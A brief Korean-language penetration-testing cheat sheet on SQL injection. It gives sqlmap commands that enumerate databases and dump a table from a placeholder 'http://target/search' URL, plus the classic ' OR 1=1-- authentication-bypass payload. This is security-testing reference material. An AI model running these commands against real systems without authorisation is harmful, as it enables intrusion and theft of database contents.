# SQL 인젝션

SQL 인젝션 취약점 점검 내용입니다.

## sqlmap 사용

```bash
sqlmap -u "http://target/search" --dbs
```

## 기본 테스트

```bash
' OR 1=1--
```

## 데이터 추출

```bash
sqlmap -u "http://target/search" -D database -T table --dump
```
